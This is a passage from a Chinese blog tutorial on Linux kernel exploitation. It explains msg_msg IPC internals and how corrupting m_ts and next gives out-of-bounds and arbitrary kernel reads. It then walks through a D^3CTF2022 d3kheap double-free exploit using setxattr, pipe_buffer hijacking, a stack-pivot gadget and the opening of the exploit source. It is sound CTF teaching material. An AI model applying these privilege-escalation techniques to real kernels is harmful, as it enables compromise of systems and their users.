class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	msg = load_msg(mtext, msgsz);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//...</span></span><br></pre></td></tr></table></figure></div>
<p>而 <code>load_msg()</code> 最终会调用到 <code>alloc_msg()</code>
分配所需的空间。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> msg_msg *<span class="title function_">load_msg</span><span class="params">(<span class="type">const</span> <span class="type">void</span> __user *src, <span class="type">size_t</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line">	<span class="type">int</span> err = -EFAULT;</span><br><span class="line">	<span class="type">size_t</span> alen;</span><br><span class="line"></span><br><span class="line">	msg = alloc_msg(len);</span><br></pre></td></tr></table></figure></div>
<p><code>alloc_msg</code> 根据数据长度创建 <code>msg_msg</code> 以及
<code>msg_msgseg</code> 构成的单向链表。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> msg_msg *<span class="title function_">alloc_msg</span><span class="params">(<span class="type">size_t</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> **<span class="title">pseg</span>;</span></span><br><span class="line">	<span class="type">size_t</span> alen;</span><br><span class="line"></span><br><span class="line">	alen = min(len, DATALEN_MSG);</span><br><span class="line">	msg = kmalloc(<span class="keyword">sizeof</span>(*msg) + alen, GFP_KERNEL_ACCOUNT);</span><br><span class="line">	<span class="keyword">if</span> (msg == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	msg-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">	msg-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	len -= alen;</span><br><span class="line">	pseg = &amp;msg-&gt;next;</span><br><span class="line">	<span class="keyword">while</span> (len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line"></span><br><span class="line">		cond_resched();</span><br><span class="line"></span><br><span class="line">		alen = min(len, DATALEN_SEG);</span><br><span class="line">		seg = kmalloc(<span class="keyword">sizeof</span>(*seg) + alen, GFP_KERNEL_ACCOUNT);</span><br><span class="line">		<span class="keyword">if</span> (seg == <span class="literal">NULL</span>)</span><br><span class="line">			<span class="keyword">goto</span> out_err;</span><br><span class="line">		*pseg = seg;</span><br><span class="line">		seg-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">		pseg = &amp;seg-&gt;next;</span><br><span class="line">		len -= alen;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> msg;</span><br><span class="line"></span><br><span class="line">out_err:</span><br><span class="line">	free_msg(msg);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="释放读取msgrcv">释放/读取：msgrcv</h3>
<p><code>msgrcv</code> 系统调用有如下调用链：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">SYS_msgrcv()</span><br><span class="line">	ksys_msgrcv()</span><br><span class="line">		do_msgrcv()</span><br></pre></td></tr></table></figure></div>
<p>其中 <code>ksys_msgrcv</code> 传入的是 <code>do_msg_fill</code>
函数指针。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">ksys_msgrcv</span><span class="params">(<span class="type">int</span> msqid, <span class="keyword">struct</span> msgbuf __user *msgp, <span class="type">size_t</span> msgsz,</span></span><br><span class="line"><span class="params">		 <span class="type">long</span> msgtyp, <span class="type">int</span> msgflg)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> do_msgrcv(msqid, msgp, msgsz, msgtyp, msgflg, do_msg_fill);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>通过 <code>msgrcv</code>
系统调用我们可以从指定的消息队列中接收指定大小的消息，内核首先会调用
<code>list_del()</code> 将其从 <code>msg_queue</code> 的双向链表上
unlink，之后调用 <code>msg_handler</code> 即 <code>do_msg_fill</code>
函数处理信息，最后再调用 <code>free_msg()</code> 释放
<code>msg_msg</code> 单向链表上的所有消息。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">do_msgrcv</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> __user *buf, <span class="type">size_t</span> bufsz, <span class="type">long</span> msgtyp, <span class="type">int</span> msgflg,</span></span><br><span class="line"><span class="params">	       <span class="type">long</span> (*msg_handler)(<span class="type">void</span> __user *, <span class="keyword">struct</span> msg_msg *, <span class="type">size_t</span>))</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    		list_del(&amp;msg-&gt;m_list);</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    		<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">out_unlock0:</span><br><span class="line">	ipc_unlock_object(&amp;msq-&gt;q_perm);</span><br><span class="line">	wake_up_q(&amp;wake_q);</span><br><span class="line">out_unlock1:</span><br><span class="line">	rcu_read_unlock();</span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(msg)) &#123;</span><br><span class="line">		free_copy(copy);</span><br><span class="line">		<span class="keyword">return</span> PTR_ERR(msg);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	bufsz = msg_handler(buf, msg, bufsz);</span><br><span class="line">	free_msg(msg);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> bufsz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><code>do_msg_fill</code> 函数内容如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">do_msg_fill</span><span class="params">(<span class="type">void</span> __user *dest, <span class="keyword">struct</span> msg_msg *msg, <span class="type">size_t</span> bufsz)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msgbuf</span> __<span class="title">user</span> *<span class="title">msgp</span> =</span> dest;</span><br><span class="line">	<span class="type">size_t</span> msgsz;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (put_user(msg-&gt;m_type, &amp;msgp-&gt;mtype))</span><br><span class="line">		<span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">	msgsz = (bufsz &gt; msg-&gt;m_ts) ? msg-&gt;m_ts : bufsz;</span><br><span class="line">	<span class="keyword">if</span> (store_msg(msgp-&gt;mtext, msg, msgsz))</span><br><span class="line">		<span class="keyword">return</span> -EFAULT;</span><br><span class="line">	<span class="keyword">return</span> msgsz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>在该函数中最终调用 <code>store_msg()</code>
完成消息向用户空间的拷贝，<strong>拷贝循环的终止条件是单向链表末尾的
NULL 指针</strong>，拷贝数据的<strong>长度</strong>主要依赖的是
<strong><code>msg_msg</code> 的 <code>m_ts</code> 成员</strong>。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">store_msg</span><span class="params">(<span class="type">void</span> __user *dest, <span class="keyword">struct</span> msg_msg *msg, <span class="type">size_t</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">size_t</span> alen;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line"></span><br><span class="line">	alen = min(len, DATALEN_MSG);</span><br><span class="line">	<span class="keyword">if</span> (copy_to_user(dest, msg + <span class="number">1</span>, alen))</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (seg = msg-&gt;next; seg != <span class="literal">NULL</span>; seg = seg-&gt;next) &#123;</span><br><span class="line">		len -= alen;</span><br><span class="line">		dest = (<span class="type">char</span> __user *)dest + alen;</span><br><span class="line">		alen = min(len, DATALEN_SEG);</span><br><span class="line">		<span class="keyword">if</span> (copy_to_user(dest, seg + <span class="number">1</span>, alen))</span><br><span class="line">			<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><code>free_msg</code> 会遍历 <code>msg_msg</code> 的
<code>next</code> 依次释放。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">free_msg</span><span class="params">(<span class="keyword">struct</span> msg_msg *msg)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line"></span><br><span class="line">	security_msg_msg_free(msg);</span><br><span class="line"></span><br><span class="line">	seg = msg-&gt;next;</span><br><span class="line">	kfree(msg);</span><br><span class="line">	<span class="keyword">while</span> (seg != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">tmp</span> =</span> seg-&gt;next;</span><br><span class="line"></span><br><span class="line">		cond_resched();</span><br><span class="line">		kfree(seg);</span><br><span class="line">		seg = tmp;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> ###
读取但不释放（MSG_COPY）：msgrcv</p>
<p>当我们在调用 <code>msgrcv</code> 接收消息时，相应的
<code>msg_msg</code> 链表便会被释放，但阅读源码我们会发现，当我们在调用
<code>msgrcv</code> 时若设置了 <code>MSG_COPY</code>
标志位，则<strong>内核会将 message
拷贝一份后再拷贝到用户空间，原双向链表中的 message 并不会被
unlink</strong>，从而我们便可以<strong>多次重复地读取同一个</strong>
<code>msg_msg</code> 链条中的数据。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">do_msgrcv</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> __user *buf, <span class="type">size_t</span> bufsz, <span class="type">long</span> msgtyp, <span class="type">int</span> msgflg,</span></span><br><span class="line"><span class="params">	       <span class="type">long</span> (*msg_handler)(<span class="type">void</span> __user *, <span class="keyword">struct</span> msg_msg *, <span class="type">size_t</span>))</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (msgflg &amp; MSG_COPY) &#123;</span><br><span class="line">		<span class="keyword">if</span> ((msgflg &amp; MSG_EXCEPT) || !(msgflg &amp; IPC_NOWAIT))</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line">		copy = prepare_copy(buf, <span class="type">min_t</span>(<span class="type">size_t</span>, bufsz, ns-&gt;msg_ctlmax));  <span class="comment">// 创建一个 msg_msg 结构 copy 用来存放拷贝的数据</span></span><br><span class="line">		<span class="keyword">if</span> (IS_ERR(copy))</span><br><span class="line">			<span class="keyword">return</span> PTR_ERR(copy);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (;;) &#123;</span><br><span class="line">		<span class="comment">//...</span></span><br><span class="line">		msg = find_msg(msq, &amp;msgtyp, mode);  <span class="comment">// 根据 msgtyp 找到要拷贝的 msg_msg</span></span><br><span class="line">		<span class="keyword">if</span> (!IS_ERR(msg)) &#123;</span><br><span class="line">			<span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * Found a suitable message.</span></span><br><span class="line"><span class="comment">			 * Unlink it from the queue.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			<span class="keyword">if</span> ((bufsz &lt; msg-&gt;m_ts) &amp;&amp; !(msgflg &amp; MSG_NOERROR)) &#123;</span><br><span class="line">				msg = ERR_PTR(-E2BIG);</span><br><span class="line">				<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * If we are copying, then do not unlink message and do</span></span><br><span class="line"><span class="comment">			 * not update queue parameters.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			<span class="keyword">if</span> (msgflg &amp; MSG_COPY) &#123;</span><br><span class="line">				msg = copy_msg(msg, copy);  <span class="comment">// 将 msg 数据拷贝到 copy 中</span></span><br><span class="line">				<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			list_del(&amp;msg-&gt;m_list);</span><br></pre></td></tr></table></figure></div>
<p>这里需要注意的是当我们使用 <code>MSG_COPY</code>
标志位进行数据泄露时，其寻找消息的逻辑<strong>并非像普通读取消息那样比对
msgtyp， 而是以 msgtyp 作为读取的消息序号</strong>（即
<code>msgtyp == 0</code> 表示读取第 0 条消息，以此类推）。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> msg_msg *<span class="title function_">find_msg</span><span class="params">(<span class="keyword">struct</span> msg_queue *msq, <span class="type">long</span> *msgtyp, <span class="type">int</span> mode)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>, *<span class="title">found</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="type">long</span> count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	list_for_each_entry(msg, &amp;msq-&gt;q_messages, m_list) &#123;</span><br><span class="line">		<span class="keyword">if</span> (testmsg(msg, *msgtyp, mode) &amp;&amp;</span><br><span class="line">		    !security_msg_queue_msgrcv(&amp;msq-&gt;q_perm, msg, current,</span><br><span class="line">					       *msgtyp, mode)) &#123;</span><br><span class="line">			<span class="keyword">if</span> (mode == SEARCH_LESSEQUAL &amp;&amp; msg-&gt;m_type != <span class="number">1</span>) &#123;</span><br><span class="line">				*msgtyp = msg-&gt;m_type - <span class="number">1</span>;</span><br><span class="line">				found = msg;</span><br><span class="line">			&#125; <span class="keyword">else</span> <span class="keyword">if</span> (mode == SEARCH_NUMBER) &#123;<span class="comment">//MSG_COPY 对应分支</span></span><br><span class="line">				<span class="keyword">if</span> (*msgtyp == count)</span><br><span class="line">					<span class="keyword">return</span> msg;</span><br><span class="line">			&#125; <span class="keyword">else</span></span><br><span class="line">				<span class="keyword">return</span> msg;</span><br><span class="line">			count++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> found ?: ERR_PTR(-EAGAIN);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span> <span class="title function_">convert_mode</span><span class="params">(<span class="type">long</span> *msgtyp, <span class="type">int</span> msgflg)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (msgflg &amp; MSG_COPY)</span><br><span class="line">		<span class="keyword">return</span> SEARCH_NUMBER;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">	mode = convert_mode(&amp;msgtyp, msgflg);</span><br><span class="line">    ...</span><br><span class="line">	msg = find_msg(msq, &amp;msgtyp, mode);</span><br></pre></td></tr></table></figure></div>
<p>同样的，对于 <code>MSG_COPY</code> 而言，数据的拷贝使用的是
<code>copy_msg()</code> 函数，其会比对<strong>源消息的 m_ts
是否大于存储拷贝的消息的 m_ts
，若大于则拷贝失败</strong>，而后者则为我们传入 <code>msgrcv()</code> 的
<code>msgsz</code>，因此若我们仅读取单条消息则需要保证<strong>两者相等</strong>
。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> msg_msg *<span class="title function_">copy_msg</span><span class="params">(<span class="keyword">struct</span> msg_msg *src, <span class="keyword">struct</span> msg_msg *dst)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">dst_pseg</span>, *<span class="title">src_pseg</span>;</span></span><br><span class="line">	<span class="type">size_t</span> len = src-&gt;m_ts;</span><br><span class="line">	<span class="type">size_t</span> alen;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (src-&gt;m_ts &gt; dst-&gt;m_ts)<span class="comment">// 有个 size 检查</span></span><br><span class="line">		<span class="keyword">return</span> ERR_PTR(-EINVAL);</span><br><span class="line"></span><br><span class="line">	alen = min(len, DATALEN_MSG);</span><br><span class="line">	<span class="built_in">memcpy</span>(dst + <span class="number">1</span>, src + <span class="number">1</span>, alen);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (dst_pseg = dst-&gt;next, src_pseg = src-&gt;next;</span><br><span class="line">	     src_pseg != <span class="literal">NULL</span>;<span class="comment">//以源 msg 链表尾为终止</span></span><br><span class="line">	     dst_pseg = dst_pseg-&gt;next, src_pseg = src_pseg-&gt;next) &#123;</span><br><span class="line"></span><br><span class="line">		len -= alen;</span><br><span class="line">		alen = min(len, DATALEN_SEG);</span><br><span class="line">		<span class="built_in">memcpy</span>(dst_pseg + <span class="number">1</span>, src_pseg + <span class="number">1</span>, alen);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	dst-&gt;m_type = src-&gt;m_type;</span><br><span class="line">	dst-&gt;m_ts = src-&gt;m_ts;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> dst;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="数据泄露-4">数据泄露</h3>
<ul>
<li>越界数据读取 在拷贝数据时对长度的判断主要依靠的是
<code>msg_msg-&gt;m_ts</code>，我们不难想到的是：若是我们能够控制一个
<code>msg_msg</code> 的 header，将其 <code>m_ts</code>
成员改为一个较大的数，我们就能够<strong>越界读取出最多将近一张内存页大小的数据</strong>。</li>
<li>任意地址读 对于大于一张内存页的数据而言内核会在 <code>msg_msg</code>
的基础上再补充加上 <code>msg_msgseg</code>
结构体，形成一个单向链表，我们不难想到的是：若是我们能够同时劫持
<code>msg_msg-&gt;m_ts</code> 与
<code>msg_msg-&gt;next</code>，我们<strong>便能够完成内核空间中的任意地址读</strong>。
但这个方法有一个缺陷，无论是 <code>MSG_COPY</code>
还是常规的接收消息，其拷贝消息的过程的判断主要依据还是单向链表的 next
指针，因此若我们需要完成对特定地址向后的一块区域的读取，<strong>我们需要保证该地址上的数据为
NULL 。</strong></li>
<li>基于堆地址泄露的堆上连续内存搜索 虽然我们不能直接读取当前
<code>msg_msg</code> 的
header，但我们不难想到的是：我们可以通过喷射大量的
<code>msg_msg</code>，从而<strong>利用越界读来读取其他
<code>msg_msg</code> 的
header</strong>，通过其双向链表成员泄露出一个“堆”上地址。
由于任意地址读要求伪造的 <code>msg_seg</code> 的 <code>next</code> 为
NULL，因此我们不仅需要一个堆地址，还需要这个堆地址对应的 8 字节数据为
NULL 。由于 <code>msg_msg</code> 是双向链表，我们在越界读其他
<code>msg_msg</code> 的 header 并且这个 <code>msg_msg</code>
所在双向链表只有它一个<code>msg_msg</code> 时就可以根据链表指针找到该
<code>msg_msg</code> 对应的 <code>msg_queue</code> 。
而由<code>msg_queue</code> 的结构可知，<code>msg_msg</code> 指向的是
<code>msg_queue</code> 的 <code>q_messages</code> ，而
<code>q_messages</code> 往前 8 字节是 <code>q_lrpid</code> 在未使用
<code>msgrcv</code> 接收消息时<strong>为 NULL</strong>
。也就是说我们得到了一个堆上地址同时这个地址上的数据为 NULL 。
在我们完成对“堆”上地址的泄露之后，我们可以在每一次读取时<strong>挑选已知数据为
NULL 的区域作为 next-&gt;next 以避免 kernel
panic</strong>，以此获得<strong>连续的搜索内存的能力</strong>，不过这需要我们拥有足够次数的更改
<code>msg_msg</code> 的 header 的能力。 #### 例题：D^3CTF2022 -
d3kheap</li>
</ul>
<p><a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/linux_kernel_pwn/D%5E3CTF2022_d3kheap" >附件下载链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>存在一次 0x400 大小 object 的 double free 。</p>
<h5 id="方法1">方法1</h5>
<p>转换成 <code>msg_msg</code> 结构体的 UAF，利用 <code>setxattr</code>
对其进行修改。实测 0x400 的 object 的 free list
偏移较大，不会对利用造成影响。</p>
<p>首先 <code>setxattr</code> 修改 <code>msg_msg</code> 越界读泄露
<code>msg_queue</code> 地址。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/1324dbea70dc1f66ecbbf4143db4e336.png"
                     
alt="在这里插入图片描述" 
                > <code>setxattr</code> 再次修改
<code>msg_msg</code> 任意地址读 <code>msg_queue</code> 泄露 double free
的 <code>msg_msg</code> 地址用于之后伪造 <code>pipe_buffer</code> 的
<code>ops</code> 指针。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/ab39fe32bff229b362a1e160e1b6d0f0.png"
                     
alt="在这里插入图片描述" 
                > 之后 <code>setxattr</code> 多次修改
<code>msg_msg</code> 任意地址读直至泄露内核地址。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/fae7c001f6c8862f233cd33fb198c444.png"
                     
alt="在这里插入图片描述" 
                > 之后将 <code>msg_msg</code> 结构体的 UAF
转换为 <code>pipe_buffer</code> 结构体的 UAF 然后劫持控制流+栈迁移执行
ROP 提权。由于有 double free 检测，因此需要先释放一个其他的
<code>msg_msg</code> 再释放被劫持的 <code>msg_msg</code> 。之后创建 pipe
劫持该 <code>msg_msg</code> 。利用 <code>setxattr</code> 修改
<code>pipe_buffer</code> 为下图所示后关闭 pipe 劫持程序执行流。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="https://i-blog.csdnimg.cn/blog_migrate/fa575a55dff730c60be45a918209a7ac.png%20=70%x"
                     
alt="在这里插入图片描述" 
                > 栈迁移有如下关键 gadget ，当调用
<code>ops-&gt;release</code> 函数时 rsi 寄存器指向
<code>pipe_buffer</code> 因此可以将栈迁移至
<code>&amp;pipe_buffer + 0x20</code> 位置。在该位置构造提权 rop
完成提权。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:FFFFFFFF812DBEDE push    rsi</span><br><span class="line">.text:FFFFFFFF812DBEDF pop     rsp</span><br><span class="line">.text:FFFFFFFF812DBEE0 test    edx, edx</span><br><span class="line">.text:FFFFFFFF812DBEE2 jle     loc_FFFFFFFF812DBF88</span><br><span class="line">...</span><br><span class="line">.text:FFFFFFFF812DBF88 ud2</span><br><span class="line">.text:FFFFFFFF812DBF8A mov     eax, 0FFFFFFEAh</span><br><span class="line">.text:FFFFFFFF812DBF8F jmp     short loc_FFFFFFFF812DBF2C</span><br><span class="line">...</span><br><span class="line">.text:FFFFFFFF812DBF2C pop     rbx</span><br><span class="line">.text:FFFFFFFF812DBF2D pop     r12</span><br><span class="line">.text:FFFFFFFF812DBF2F pop     r13</span><br><span class="line">.text:FFFFFFFF812DBF31 pop     rbp</span><br><span class="line">.text:FFFFFFFF812DBF32 retn</span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/xattr.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_core</span><span class="params">(<span class="type">int</span> core)</span> &#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">qword_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] %s:\n&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_rflags, user_sp, user_ss;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">()</span> &#123; system(<span class="string">&quot;cat flag;/bin/sh&quot;</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">next</span>, *<span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* one msg_msg structure for each message */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span 